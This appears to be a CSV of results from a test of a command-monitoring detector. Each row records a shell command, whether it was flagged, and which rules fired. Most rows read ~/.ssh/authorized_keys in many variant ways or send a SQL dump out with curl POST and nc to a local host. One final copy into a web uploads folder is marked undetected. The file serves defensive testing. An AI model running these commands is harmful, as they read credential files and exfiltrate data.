scenario,step,num,command,detected,unapproved_exec,execve_grep_recursive,unapproved_zip_path,unapproved_cp_path,unapproved_file_tool_use,unapproved_link,unapproved_symlink,allowed_read_file,allowed_read_dir,allowed_write,unapproved_move,allowed_chmod,unapproved_network_destination,unapproved_path_delete,read_db_large,openat_burst_server,openat_burst_home,recursive_traversal_server,recursive_traversal_home,openat_burst_app,traversal_uploads_path
a,1,1,cat ~/.ssh/authorized_keys,True,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,2,xxd ~/.ssh/authorized_keys,True,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,3,hexdump ~/.ssh/authorized_keys,True,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,4,awk 1 ~/.ssh/authorized_keys,True,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,5,head -100 ~/.ssh/authorized_keys,True,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,6,"while IFS= read -r line; do printf '%s\n' ""$line""; done < ~/.ssh/authorized_keys",True,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,7,grep . ~/.ssh/authorized_keys,True,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,8,find ~/.ssh -name authorized_keys -exec cat {} \;,True,1,0,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,9,busybox cat ~/.ssh/authorized_keys,True,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,10,tr -d '' < ~/.ssh/authorized_keys,True,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,11,sed '' ~/.ssh/authorized_keys,True,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,12,strings ~/.ssh/authorized_keys,True,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,13,"printf '%s\n' ""$(<~/.ssh/authorized_keys)""",True,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,14,data/a/1_1.py,True,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,1,1,cat /tmp/dump.sql | base64,True,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,1,2,"curl -X POST -F ""file=@/tmp/dump.sql"" http://127.0.0.1:12345/upload",True,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,1,3,"curl -X POST -F ""file=@./dump_.sql"" http://127.0.0.1:12345/upload",True,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,1,4,nc 127.0.0.1 1234 < /tmp/dump.sql,True,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,1,5,data/3/3_1.py,True,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,2,5
b,3,1,"while read -r line; do printf ""%s"" ""$line""; done < /tmp/dump.sql > ./static/uploads/attachments/019f16367a8e40fc8e8505856f57f746.txt",False,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
